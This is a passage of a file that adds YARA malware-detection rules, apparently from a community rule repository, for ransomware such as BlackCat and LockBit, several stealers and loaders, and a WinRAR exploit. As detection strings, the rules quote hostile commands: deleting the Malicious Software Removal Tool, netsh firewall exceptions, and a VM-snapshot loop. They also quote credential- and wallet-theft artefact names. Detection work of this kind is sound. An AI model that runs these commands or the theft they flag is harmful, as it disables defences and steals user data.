+		$firewall_sharedaccess_reg_key = "\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\" ascii wide
+		$firewall_allow = "netsh firewall add allowedprogram" nocase ascii wide
+		$firewall_changelogsize = "netsh advfirewall set currentprofile logging maxfilesize" ascii wide nocase
+		
+		// Microsoft Windows Malicious Software Removal Tool
+		$MRT_reg_key = "\\SOFTWARE\\Policies\\Microsoft\\MRT" ascii wide
+		$MRT_reg_key_wow64 = "\\SOFTWARE\\WOW6432NODE\\POLICIES\\MICROSOFT\\MRT" ascii wide
+		$MRT_del = "del C:\\Windows\\System32\\mrt.exe" nocase ascii wide
+		
+		// Edge
+		$edge_phishing_filter = "\\SOFTWARE\\Policies\\Microsoft\\MicrosoftEdge\\PhishingFilter" ascii wide
+		
+		// Internet Explorer
+		$ie_phishing_filter = "\\SOFTWARE\\Microsoft\\Internet Explorer\\PhishingFilter" ascii wide
+		
+		// key, value pairs - these may have false positives
+		$k1 = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" ascii wide
+		$k2 = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" ascii wide
+		$k3 = "\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" ascii wide
+		$k4 = "\\SOFTWARE\\MICROSOFT\\SECURITY CENTER" nocase ascii wide
+		$k5 = "\\SYSTEM\\ControlSet001\\Services\\Sense" ascii wide
+		
+		$v1 = "HideSCAHealth" ascii wide
+		$v2 = "SecurityHealth" ascii wide
+		$v3 = "EnableSmartScreen" ascii wide
+		$v4 = "FIREWALLDISABLENOTIFY" ascii wide nocase
+		$v5 = "UPDATESDISABLENOTIFY" nocase ascii wide
+		$v6 = "Start" nocase ascii wide
+
+	condition:
+		any of ($defender_*) or any of ($firewall_*) or any of ($MRT_*) or any of ($edge_*) or any of ($ie_*) or (1 of ($k*) and 1 of ($v*))
+}rule ELF_RANSOMWARE_BLACKCAT : LinuxMalware
+{
+	meta:
+		description = "Detect Linux version of BlackCat Ransomware"
+		author = "Jesper Mikkelsen"
+		reference = "https://www.virustotal.com/gui/file/056d28621dca8990caf159f8e14069a2343b48146473d2ac586ca9a51dfbbba7"
+		date = "2022-05-10"
+        yarahub_reference_md5 = "c7e39ead7df59e09be30f8c3ffbf4d28"
+        yarahub_uuid = "4354fe5a-ee0c-47e3-a595-2824dd82928d"
+        yarahub_license = "CC0 1.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+		techniques = "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification"
+		tactic = "Defense Evasion"
+		mitre_att = "T1222.002"
+		sharing = "TLP:WHITE"
+        dname = "Ransom.Linux.BLACKCAT.YXCDFZ"
+		score = 75
+	strings:
+		$pattern0 = "sbin*/cdrom*/dev*/etc*/lib**lost+found*/proc*/run*/snap*/tmp*/sys*/usr*/bi"
+		$pattern1 = "n `vim-cmd vmsvc/getallvms| awk '{print$1}'`;do vim-cmd vmsvc/sn"
+		$pattern2 = { BB 6C EA 3F AA 84 31 C4 13 19 F2 
+        	   4C 47 F1 29 B7 FE 88 43 CA EF 60 
+               98 31 56 7A 97 30 CD 92 4C CB 74 
+               EB 26 B6 65 03 FD 4D DC D1 A1 A7
+               CC 39 7A 5C 75 40 10 21 64 A8 CB
+               DA DD B2 C4 DB 46 5A 1F 20 }
+		$pattern3 = { 78 15 58 9C 99 1A C5 47 BC 7B B9
+        	   31 5D 74 24 C7 E9 E0 72 B1 08 EF
+               EF 6A 2D 8E 93 1C CC 81 0E DC 66
+               4C 6B AA 87 43 F6 71 A2 22 8A 07
+               43 2D 17 9D CB 0B 27 EB 2A 04 BA
+               30 0F 65 C6 46 EE 6A 5B 86 }
+		$pattern4 = { 72 78 B3 93 0F 69 5B 48 F4 D0 89
+        	   14 1E C0 61 CF E5 79 18 A5 98 68
+               F0 7E 63 D1 EA 71 62 4A 02 AA 99 
+               F3 7B C0 E4 E2 93 1B 1F 5B 0E D8 
+               97 0F E6 03 6C B6 9F 69 11 A7 77 
+               B2 EA 1E 6D BD EB 85 85 66 }
+		$pattern5 = { 39 67 68 97 DB 59 03 55 34 5A B8 
+        	   62 DF 64 D3 A0 30 D1 0A 58 A9 EF 
+               61 9A 46 EC DA AD AD D2 B1 6F 42 
+               AB AA B3 A0 95 C1 71 4F 96 7A 46 
+               A4 A8 11 84 4B 25 4A 8F BA 1B 21 
+               4D 55 18 9A 7A BE 26 F1 B8 51 }
+		$pattern6 = { 4B 35 35 C4 3D D4 3A 59 A7 5C 1C 
+        	   69 D1 BD 13 F4 0A 98 72 88 7C 79 
+               7D 15 BC D3 B0 70 CA 32 BF ED 11 
+               17 DE 91 67 F6 D1 0C 91 42 45 5A 
+               E7 A3 4A C7 3C 86 2B BB 4A 67 24 
+               26 8A CD E9 43 FC 2C E6 DE 27 09 
+               87 A2 51 E8 88 3F }
+		$pattern7 = { 6B DA AE D5 B0 21 17 CF BF 20 8C 
+        	   27 64 DB 35 5E 0E A6 24 B6 D5 5D 
+               9D 2B 16 D5 C9 C3 CD 2E 70 BA A7 
+               53 61 52 7C A8 D8 48 73 A9 43 A0 
+               A8 52 FA D9 C2 2F EB 31 19 D4 52 
+               BB F0 87 4E 53 2B 7C F7 2A 41 01 
+               E6 C2 9A FA 5F D8 95 FB C4 }
+	condition:
+		all of them
+}rule elf_rekoobe_b3_06c9 {
+
+    meta:
+        author                    = "Johannes Bader"
+        date                      = "2022-09-02"
+        description               = "detects the Rekoobe Linux backdoor"
+        hash1_md5                 = "55ab7e652976d25997875f678c935de7"
+        hash1_sha1                = "dc6beb5019ee21ab207c146ece5080d00f20a103"
+        hash1_sha256              = "a89ebd7157336141eb14ed9084491cc5bdfce103b4db065e433dff47a1803731"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.0"
+        yarahub_author_email      = "yara@bin.re"
+        yarahub_author_twitter    = "@viql"
+        yarahub_license           = "CC BY-SA 4.0"
+        yarahub_reference_md5     = "55ab7e652976d25997875f678c935de7"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "06c95657-8897-443c-bc8e-f0f5cf6cf055"
+
+    strings:
+        $sha_1  = {01 23 45 67 [0-10] 89 AB CD EF [0-10] FE DC BA 98 [0-10] 76 54 32 10 [0-10] F0 E1 D2 C3}
+
+        $hmac_1 = {36 36 36 36 36 36 36 36}
+        $hmac_2 = {5C 5C 5C 5C 5C 5C 5C 5C}
+
+        $str_term_1  = {C6 00 54}
+        $str_term_2  = {C6 40 03 4D}
+        $str_term_3  = {C6 40 01 45}
+        $str_term_4  = {C6 40 04 3D}
+        $str_term_5  = {C6 40 02 52}
+        $str_term_6  = {C6 40 02 52}
+
+        $str_histfile_1 = {C6 00 48}
+        $str_histfile_2 = {C6 40 05 49}
+        $str_histfile_3 = {C6 40 01 49}
+        $str_histfile_4 = {C6 40 06 4C}
+        $str_histfile_5 = {C6 40 02 53}
+        $str_histfile_6 = {C6 40 07 45}
+        $str_histfile_7 = {C6 40 03 54}
+        $str_histfile_8 = {C6 40 08 3D}
+        $str_histfile_9 = {C6 40 04 46}
+
+    condition:
+        uint32(0) == 0x464C457F and
+        (
+            all of them
+        )
+}
+
+
+rule Embedded_RTF_File
+{
+    meta:
+        author = "Nicholas Dhaeyer - @DhaeyerWolf"
+        date_created = "2023-07-18"
+        date_last_modified = "2023-07-18"
+        description = "Related to CVE-2023-36884. Hunts for any zip-like archive (eg. office documents) that have an embedded .rtf file, based on the '.rtf' extension of the file."
+		yarahub_uuid = "800682b8-e810-49d2-91b3-dfaafb61637f"
+		date = "2023-07-18"
+		yarahub_license = "CC BY-SA 4.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_reference_md5 = "b6ad6198e155921dc11c855c03d8c264"
+
+    strings:
+		$header = { 50 4B 03 04 } //beginning of a archive file
+		$header1 = { D0 CF 11 E0 A1 B1 1A E1 } //Older formats of office files
+	
+        $rtf =  { 2E 72 74 66 } //.rtf
+		
+		$str1 = "Microsoft Office Word" //doc
+		$str2 = "MSWordDoc" //doc
+		$str3 = "Word.Document.8" //doc
+		$str4 = "Microsoft Office PowerPoint" //ppt
+		$str5 = "Microsoft Excel" //xls
+		$str6 = "Excel.Sheet.8" //xls
+		$str7 = "document.xml" //docx
+		$str8 = "presentation.xml" //pptx
+		$str9 = "workbook.xml" //xlsx
+		$str10 = "workbook.bin" //xlsb
+		$str11 = "<?mso-application progid=\"Word.Document\"?>" //word_xml
+		$str12 = "<?mso-application progid=\"PowerPoint.Show\"?>" //ppt_xml
+		$str13 = "<?mso-application progid=\"Excel.Sheet\"?>" //Excel_xml
+		
+    condition:
+        ($header at 0 or $header1 at 0)
+		and (#rtf > 1)
+		and 1 of ($str*)
+}rule Erbium_Loader
+{
+    meta:
+        author                    = "@_FirehaK <yara@firehak.com>"
+        date                      = "2022-09-02"
+        description               = "Detects Erbium Stealer's loader"
+        malpedia_family           = "win.erbium_stealer"
+        modified                  = "2022-09-02"
+        yarahub_author_twitter    = "@_FirehaK"
+        yarahub_author_email      = "yara@firehak.com"
+        yarahub_reference_link    = "https://tria.ge/220901-136gasbhdm/behavioral2"
+        yarahub_reference_md5     = "7e2e4af82407b97d8f00d1ff764924d4"
+        yarahub_uuid              = "1f3b58cb-cb17-45ba-aa2a-a719a4a21052"
+        yarahub_license           = "CC BY 4.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+
+    strings:
+        $s1 = "api.php?method=getstub&bid=" wide
+
+        $x1 = { 53 6a?? 68???????? 50 ff15???????? 8bd8 894424 }
+        $x2 = { 8b35???????? 40 6a00 6a00 50 68???????? 6a00 6a00 ffd6 8bc8 33c0 660f1f440000 }
+        $x3 = { 51 8d4c24?? 40 51 50 68???????? 6a00 6a00 ffd6 33c0 90 }
+        $x4 = { 8b5c24?? 6a00 6a01 6a01 6a01 6a01 57 53 ff 50 e8???????? 83c4?? 85db 74 }
+        $x5 = { c745??00000000 8d55?? 52 6a40 8b45?? 8b48?? 51 8b55?? 52 8b45?? 50 ff55?? 33c9 894d?? 894d?? 894d?? 894d?? 894d?? 894d?? 8b15???????? 8955?? a1???????? 8945?? 8b4d?? 894d?? 8b55?? 8955?? 8b45?? 8945?? 6a00 6800100000 8b4d?? 51 8b55?? 52 8b45?? 50 ff55?? 85c0 75  }
+        $x6 = { 6800800000 6a00 8b55f8 52 8b4508 50 ff55fc 6800800000 6a00 8b4df0 51 8b5508 52 ff55fc 6800800000 6a00 8b45e8 50 8b4d08 51 ff55fc 32c0 eb0c }
+
+    condition:
+        uint16(0) == 0x5a4d
+        and (
+            2 of ($x*)
+            or (
+                $s1
+                and 1 of ($x*)
+            )
+        )
+}rule Erbium_Stealer_Obfuscated
+{
+    meta:
+        author                    = "@_FirehaK <yara@firehak.com>"
+        date                      = "2022-09-02"
+        description               = "Erbium Stealer in its obfuscated format"
+        malpedia_family           = "win.erbium_stealer"
+        modified                  = "2022-09-09"
+        yarahub_author_twitter    = "@_FirehaK"
+        yarahub_author_email      = "yara@firehak.com"
+        yarahub_reference_link    = "https://tria.ge/220902-mbcs1seef7"
+        yarahub_reference_md5     = "71c3772dd2f4c60a13e3e5a1180154b7"
+        yarahub_uuid              = "29756611-4992-4ff5-b2cb-ffe867dfb823"
+        yarahub_license           = "CC BY 4.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+
+    strings:
+        // <space>Zig Zig Zig
+        $zig = { 20 5A 69 67 20 5A 69 67 20 5A 69 67 }
+        // ZigRich Zig
+        $richzig = { 5A 69 67 52 69 63 68 20 5A 69 67 }
+
+        $x1 = { e800000000 8b0424 83042408 c3 }
+        $x2 = { 64a130000000 8b400c 8985????ffff 8b85????ffff 8b400c 8985????ffff }
+        $x3 = { b8???????? f7ea 035424?? c1fa?? 8bc2 c1e8?? 03c2 8b5424?? 0fbec0 8aca 6bc039 2ac8 80c137 304c14?? 42 895424?? 83fa?? 7c }
+        $x4 = { 33d2 8bc1 f7f6 80c2?? 30?40c(??|????0000) 41 83f9?? 7c }
+        $x5 = { 8b??????ffff 03??????ffff 0fbe?? 8b85????ffff 99 be??000000 f7fe 83c2?? 33ca 8b95????ffff 0395????ffff 880a eb }
+        $x6 = { 8b45?? 0fbe4c05?? 8b45?? 99 be??000000 f7fe 83c2?? 33ca 8b55?? 884c15?? eb }
+        $x7 = { 6a05 68???????? 6a00 68????0000 e8???????? 83c410 33d2 b915000000 f7f1 8955?? 837d??00 75?? 6a?? 68???????? 6a?? 68????0000 e8???????? 83c4?? 33d2 b910270000 f7f1 8995????ffff }
+        $x8 = { 6a05 68???????? 6a00 68????0000 e8???????? 83c410 33d2 6a?? 59 f7f1 8955?? 837d??00 75?? 6a05 68???????? 6a00 68????0000 e8???????? 83c410 33d2 b910270000 f7f1 8995????ffff }
+        $x9 = { 6910???????? 83c0?? 69db???????? 8bca c1e918 33ca 69d1???????? 33da 83ef?? 75 }
+
+    condition:
+        uint16(0) == 0x5a4d
+        and (
+            (
+                $zig
+                and $richzig
+                and 2 of ($x*)
+            )
+            or 3 of ($x*)
+        )
+}rule EXPLOIT_WinRAR_CVE_2023_38831_Aug23 {
+    meta:
+        version = "1.0"
+        date = "2023-08-23"
+        modified = "2023-08-23"
+        status = "RELEASED"
+        sharing = "TLP:CLEAR"
+        source = "SECUINFRA Falcon Team"
+        author = "Marius Genheimer @ Falcon Team"
+        description = "Detects ZIP archives potentially exploiting CVE-2023-38831 in WinRAR"
+        category = "EXPLOIT"
+        mitre_att = "T1203"
+        actor_type = "CRIMEWARE"
+        reference = "https://www.group-ib.com/blog/cve-2023-38831-winrar-zero-day"
+        minimum_yara = "4.2"
+        hash0 = "43f5eb815eed859395614a61251797aa777bfb694a9ef42fbafe058dff84d158"
+        hash1 = "61c15d6a247fbb07c9dcbce79285f7f4fcc45f806521e86a2fc252a311834670"
+        hash2 = "2010a748827129b926cf3e604b02aa77f5a7482da2a15350504d252ee13c823b"
+        hash3 = "bfb8ca50a455f2cd8cf7bd2486bf8baa950779b58a7eab69b0c151509d157578"
+        yarahub_uuid = "67176e05-1858-4ff4-ad4b-154f549ec5d4"
+        yarahub_reference_md5 = "3a7ad5fdfc9e51c4ee5df425169add1a"
+        yarahub_license = "CC BY 4.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_author_twitter = "@SI_FalconTeam"
+
+    strings:
+        $kw_1 = "Trade" nocase ascii
+        $kw_2 = "Trading" nocase ascii
+        $kw_3 = "Strategy" nocase ascii
+        $kw_4 = "Strategies" nocase ascii
+        $kw_5 = "Screenshot" nocase ascii
+        $kw_6 = "Indicator" nocase ascii
+
+        $doubleext_cmd = {2E ?? ?? ?? 20 2E 63 6D 64}
+        $doubleext_bat = {2E ?? ?? ?? 20 2E 62 61 74}
+        $doubleext_vbs = {2E ?? ?? ?? 20 2E 76 62 73}
+        $doubleext_wsf = {2E ?? ?? ?? 20 2E 77 73 66}
+        $doubleext_wsh = {2E ?? ?? ?? 20 2E 77 73 68}
+        $doubleext_ps1 = {2E ?? ?? ?? 20 2E 70 73 31}
+        $doubleext_js = {2E ?? ?? ?? 20 2E 6A 73}
+
+        $s_ico = ".ico" ascii
+
+    condition:
+        uint16(0) == 0x4B50
+        and (any of ($kw_*) or none of ($kw_*))
+        and any of ($doubleext_*)
+        and #s_ico >= 1
+}rule GHISLER_Stealer_1 : ghisler stealer spyware
+{
+    meta:
+        author                    = "Andre Gironda"
+        date                      = "2022-11-11"
+        description               = "GHISLER Golang based GO Stealer , POST /sendlog to http port 5000 , Userid HTTP header"
+        hash                      = "30c1f93a3d798bb18ef3439db0ada4e0059e1f6ddd5d860ec993393b31a62842"
+        hash2                     = "82040e02a2c16b12957659e1356a5e19"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.0"
+        yarahub_author_twitter    = "@AndreGironda"
+        yarahub_license           = "CC0 1.0"
+        yarahub_reference_md5     = "82040e02a2c16b12957659e1356a5e19"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "49ce8292-4a72-42d1-ab38-cdc076ff503d"
+   strings:
+        $hex_45ef40 = { 83 ec 24 8b 5c 24 28 c7 44 24 20 ff ff ff ff 89 5c 24 1c 64 8b 0d 14 00 00 00 8b 89 00 00 00 00 8b 49 18 8b 89 c8 01 00 00 89 4c 24 18 c7 44 24 14 00 00 00 00 c7 44 24 10 }
+        $hex_4022a0 = { 8b 6c 24 04 f7 c5 07 00 00 00 74 05 e8 af }
+        $s1 = "SetWaitableTimer" 
+        $s2 = "SwitchToThread"
+        $s3 = "time.Time.date"
+        $s4 = "time.now"
+        $go = "vendor/golang.org/x/net/dns/dnsmessage/message.go"
+        $user = "Userid:"
+        $name = "GHISLER"
+    condition:
+        all of them
+}
+rule Guloader_VBScript {
+
+  meta:
+      author = "Ankit Anubhav - ankitanubhav.info"
+      description = "Detects GuLoader/CloudEye VBScripts"
+      date = "2022-07-14"
+      yarahub_author_twitter = "@ankit_anubhav"
+      yarahub_author_email = "ankit.yara@inbox.ru"
+      yarahub_reference_link = "https://twitter.com/ankit_anubhav"
+      yarahub_reference_md5 = "00e59c5ea76face15c42450c71676e03"
+      yarahub_uuid = "7d7e2b7c-5536-4688-b202-e79c401e7195"
+      yarahub_license = "CC0 1.0"
+      yarahub_rule_matching_tlp = "TLP:WHITE"
+      yarahub_rule_sharing_tlp = "TLP:WHITE"
+      malpedia_family = "win.CloudEye"
+
+strings:
+
+
+	$x = { 20 26 20 22 }
+	$y = { 54 69 6d 65 56 61 6c 75 65 28 22 ( 31 3a 31 3a 31 | 32 3a 32 3a 32 | 33 3a 33 3a 33 | 34 3a 34 3a 34 | 35 3a 35 3a 35 | 36 3a 36 3a 36 | 37 3a 37 3a 37 | 38 3a 38 3a 38 | 39 3a 39 3a 39 | 31 30 3a 31 30 3a 31 30 | 31 31 3a 31 31 3a 31 31 | 31 32 3a 31 32 3a 31 32 | 31 33 3a 31 33 3a 31 33 | 31 34 3a 31 34 3a 31 34 | 31 35 3a 31 35 3a 31 35 | 31 36 3a 31 36 3a 31 36 | 31 37 3a 31 37 3a 31 37 | 31 38 3a 31 38 3a 31 38 | 31 39 3a 31 39 3a 31 39 | 32 30 3a 32 30 3a 32 30 | 32 31 3a 32 31 3a 32 31 | 32 32 3a 32 32 3a 32 32 | 32 33 3a 32 33 3a 32 33 ) 22 29 }
+	//$z = { 44 69 6d } new variants have started using loose binding so commenting out this line !!
+condition:
+	#x > 20 and $y and filesize < 1999999
+
+
+}
+rule hunt_redline_stealer
+{
+  meta:
+      description = "Search for samples containing certain fingerprints"
+      date = "2023-01-12"
+      yarahub_reference_md5 = "26ddf1d4f84651f1b35fb6885d6ed325"
+      yarahub_uuid = "0835dd41-46f7-4113-8248-6f31e751e514"
+      yarahub_license = "CC0 1.0"
+      yarahub_rule_matching_tlp = "TLP:WHITE"
+      yarahub_rule_sharing_tlp = "TLP:WHITE"
+  strings:
+      $a = "(te%psehczev" wide
+      $b = {2f 00 3a 00 ?? 00 ?? 00 ?? 00 ?? 00 ?? 00 ?? 00 2f 00 ?? 00 ?? 00 ?? 00 3a 00 ?? ?? 3a 00 ?? ?? ?? ?? 2f 00 3a 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 2f 00 ?? ?? ?? ?? ?? ?? ?? ?? 2f 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00}
+      $c = "Parella Javan" wide
+      $d = "ExotismWaura" wide
+  condition:
+      uint16(0) == 0x5A4D and (any of them)
+}rule koi_loader {
+    meta:
+        author = "@luc4m"
+        date = "2023-03-26"
+        link = "https://medium.com/@lcam/updates-from-the-maas-new-threats-delivered-through-nullmixer-d45defc260d1"
+        hash_md5 = "9725ec075e92e25ea5b6e99c35c7aa74"
+        tlp = "WHITE"
+	yarahub_uuid = "d0872aaf-306d-4068-b246-86d12a6e56f7"
+        yarahub_license =  "CC0 1.0"
+        yarahub_rule_matching_tlp =  "TLP:WHITE"
+        yarahub_rule_sharing_tlp =  "TLP:WHITE"
+        yarahub_reference_md5= "9725ec075e92e25ea5b6e99c35c7aa74" 
+    strings:
+
+ $tm_0 = /debug[0-9]{1,3}\.ps1/i wide
+ $tm_1 = "First stage size: {0}" wide
+ $tm_2 = "Second stage size: {0}" wide
+ $tm_3 = "Telegram Desktop\\tdata" wide
+ $tm_4 = "Executed " wide
+ $tm_5 = " or downloading " wide
+ $tm_6 = "LDR" wide
+
+ $curve_0 = "key must be 32 bytes long (but was {0} bytes long)" wide
+ $curve_1 = "rawKey must be 32 bytes long (but was {0} bytes long)" wide
+ $curve_2 = "rawKey" wide 
+ $curve_3 = "key" wide 
+
+    condition:
+         (5 of ($tm_*)) and (1 of ($curve_*))
+}
+
+rule LATAMHotel_Obfuscated_BAT {
+
+  meta:
+      author = "Ankit Anubhav - ankitanubhav.info"
+      description = "Detects a campaign targeted towards LatinAmerican Hotels,generally leading to AsyncRAT"
+      date = "2022-07-23"
+      yarahub_author_twitter = "@ankit_anubhav"
+      yarahub_author_email = "ankit.yara@inbox.ru"
+      yarahub_reference_link = "https://threatresearch.ext.hp.com/stealthy-opendocument-malware-targets-latin-american-hotels/"
+      yarahub_reference_md5 = "00e59c5ea76face15c42450c71676e03"
+      yarahub_uuid = "a31088bd-4baf-4f99-a89a-08f03389110b"
+      yarahub_license = "CC0 1.0"
+      yarahub_rule_matching_tlp = "TLP:WHITE"
+      yarahub_rule_sharing_tlp = "TLP:WHITE"
+      malpedia_family = "win.asyncrat"
+
+strings:
+
+
+	$x = "1%%"
+	$y = /~[0-9]{1,2}/
+	$z = /=[A-Za-z0-9]{62}/
+
+condition:
+	#x > 90 and #y > 90 and $z  and filesize <30000
+
+
+}
+
+
+rule lnk_from_chinese : odd {
+    meta:
+        category = "apt"
+        description = "what the rule does"
+        author = "malcat"
+        reliability = 50
+        date = "2022-07-04"
+        yarahub_uuid = "17a4f2d6-0792-45de-8b90-749bec1bcc18"
+        yarahub_license = "CC0 1.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_reference_md5 = "e3f89049dc5f0065ee4d780f8aef9c04"
+    strings:
+        $magic = { 4C0000000114020000000000C000000000000046 }
+        $serial = {90962EBA}
+    condition:
+        $magic at 0 and $serial
+}
+rule loader_win_bumblebee {
+   meta:
+      author = "SEKOIA.IO"
+      description = "Find BumbleBee samples based on specific strings"
+      date = "2022-06-02"
+      yarahub_author_twitter = "@sekoia_io"
+      yarahub_reference_link = "https://blog.sekoia.io/bumblebee-a-new-trendy-loader-for-initial-access-brokers/"
+      yarahub_reference_md5 = "6d58437232ebab24d810270096e6e20b"
+      yarahub_uuid = "8fd795c7-6896-498c-a892-de9da6427b60"
+      yarahub_license = "CC BY 4.0"
+      yarahub_rule_matching_tlp = "TLP:WHITE"
+      yarahub_rule_sharing_tlp = "TLP:WHITE"
+      malpedia_family = "win.bumblebee"
+
+   strings:
+      $str0 = { 5a 00 3a 00 5c 00 68 00 6f 00 6f 00 6b 00 65 00 72 00 32 00 5c 00 43 00 6f 00 6d 00 6d 00 6f 00 6e 00 5c 00 6d 00 64 00 35 00 2e 00 63 00 70 00 70 00 } // Z:\hooker2\Common\md5.cpp
+      $str1 = "/gates" ascii
+      $str2 = "3C29FEA2-6FE8-4BF9-B98A-0E3442115F67" wide
+
+   condition:
+      uint16be(0) == 0x4d5a and all of them
+}
+rule LockBit3_ransomware {
+    meta: 
+        author = "BlackBerry"
+        date = "2022-08-03"
+        version = "1"
+        TLP = "clear"
+        description = "Rule detecting Lockbit3 ransomware samples"
+	yarahub_reference_md5 = "44e8c23bfb649ecf4cb753ec332899dd"
+	yarahub_uuid = "fa7215eb-3fc5-4b15-b44d-2b182d7c5e66"
+	yarahub_license = "CC BY 4.0"
+	yarahub_rule_matching_tlp = "TLP:WHITE"
+	yarahub_rule_sharing_tlp = "TLP:WHITE"
+    strings: 
+        $code1 = {004E01536574506978656C0000590153657454657874436F6C6F7200006B01546578744F757457000067646933322E646C6C0063004372656174654469616C6F67506172616D570000}
+        $code2 = {7D0C66AD6685C07505E98A0000006683F841720C6683F84677066683E837EB266683F861720C6683F86677066683E857EB146683F830720C6683F83977066683E830EB02EBBC0FB6C8C1E10466AD6685C07502EB436683F841720C6683F84677066683E837EB296683F861720C6683F86677066683E857EB176683F830720C6683F83977066683E830EB05E972FFFFFF32C1AAE96AFFFF}
+        $code3 = {FFFF8BC885C974348BF78BD166B82000F266AF85C975128BCA894DFC8B7D0CF366A56633C066ABEB132BD14A87D1894DFC8B7D0CF366A56633C066AB8B45FC5F5E5A8BE55DC2080090558BEC81EC840000}
+    condition:
+        uint16(0) == 0x5a4d and
+        filesize < 3MB and
+        2 of them
+}import "pe"
+
+rule LockbitBlack_Loader {
+    meta:
+        date = "2022-07-03"
+        description = "Hunting rule for the Lockbit Black loader, based on https://twitter.com/vxunderground/status/1543661557883740161"
+        author = "Zander Work"
+        yarahub_author_twitter = "@captainGeech42"
+        yarahub_uuid = "e4800674-46f7-4ba9-9d00-b9f2a5f51371"
+        yarahub_license = "CC BY 4.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_reference_md5 = "38745539b71cf201bb502437f891d799"
+    strings:
+        $c1 = { 02 f1 2a f1 8b c8 d3 ca 03 d0 }
+        $c2 = { 8a 54 ?? 00 02 d3 8a 5c ?? 00 8a 54 ?? 00 8a 54 ?? 00 fe c2 8a 44 ?? 00 30 07 }
+        $c3 = { 8b d8 8b 5b 08 8b 73 3c 03 f3 0f b7 7e 06 8d b6 f8 00 00 00 }
+        $hash1 = { 3d 75 ba 0e 64 }
+        $hash2 = { 3d 75 80 91 76 }
+        $hash3 = { 3d 1b a4 04 00 }
+        $hash4 = { 3d 9b b4 84 0b }
+    condition:
+        pe.is_pe and
+        filesize > 100KB and filesize < 200KB and
+        5 of them and
+        pe.section_index(".itext") >= 0 and
+        pe.section_index(".pdata") >= 0
+}rule lockbitblack_ransomnote {
+    meta:
+        date = "2022-07-02"
+        description = "Hunting rule for LockBit Black/3.0 ransom notes"
+        yarahub_author_twitter = "@captainGeech42"
+        yarahub_uuid = "cc2308df-9b42-4169-8146-c63b0bc6b1f7"
+        yarahub_license = "CC BY 4.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_reference_md5 = "954d81de1c53158b0050b38d4f4b4801"
+    strings:
+        $s1 = "~~~ LockBit 3.0" ascii wide
+        $s2 = "the world's fastest and most stable" ascii wide
+        $s3 = "http://lockbitapt" ascii wide
+        $s4 = ">>>>> Your data is stolen and encrypted" ascii wide
+    condition:
+        filesize < 20KB and 2 of them and #s3 > 10
+}rule LucaStealer {
+
+
+   meta:
+ 
+        author = "Chat3ux" 
+        date = "2022-09-08" 
+        yarahub_reference_md5 = "c73c38662b7283befc65c87a2d82ac94" 
+        yarahub_uuid = "71c9c97e-161a-41c8-8014-4ee186c92a22" 
+        yarahub_license = "CC0 1.0" 
+        yarahub_author_twitter = "@Chat3ux_" 
+        yarahub_rule_matching_tlp = "TLP:WHITE" 
+        yarahub_rule_sharing_tlp = "TLP:WHITE"  
+        description = "Lucasstealer"
+
+   strings:
+
+      $s1 = "passwords.txt" ascii wide
+      $s2 = "cookies" ascii wide
+      $s3 = "telegram" ascii wide
+      $s4 = "sensfiles.zip" ascii wide
+      $s5 = "screen-.png" ascii wide
+      $s6 = "system_info.txt" ascii wide
+      $s7 = "out.zip" ascii wide
+      $s8 = "info.txt" ascii wide
+      $s9 = "system_info.txt"
+      $s11 = "dimp.sts"
+      $s12 = "Credit Cards:"
+      $s13 = "Wallets:"
+
+   condition:
+   ( 6 of ($s*) )
+}rule MALWARE_APT29_SVG_Delivery_Jul23
+{
+    meta:
+        author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
+        description = "Detects Javascript code in crafted SVG files delivering malware"
+        reference = "https://twitter.com/StopMalvertisin/status/1677192618118369280"
+        date = "2023-07-07"
+        tlp = "CLEAR"
+        hash = "4875a9c4af3044db281c5dc02e5386c77f331e3b92e5ae79ff9961d8cd1f7c4f"
+        yarahub_uuid = "f4f38e82-5252-44dc-b020-a317bb3daf84"
+        yarahub_reference_md5 = "295527e2e38da97167979ade004de880"
+        yarahub_license = "CC BY 4.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_author_twitter = "@SI_FalconTeam"
+
+    strings:
+        $xml_tag = {3c 3f 78 6d 6c}
+        $svg_tag = {3c 73 76 67}
+
+        $js_tag = "<script"
+        $js_mimeJS = "text/javascript"
+        $js_mimeOS = "application/octet-stream"
+        $js_create = "URL.createObjectURL("
+        $js_window = "window.location.assign("
+        $js_revoke = "URL.revokeObjectURL("
+        $js_file = "new File("
+        $js_remote = "window.location.href("
+
+        $atom_mime = "application/atom+xml"
+
+    condition:
+        $xml_tag at 0x0
+        and $svg_tag
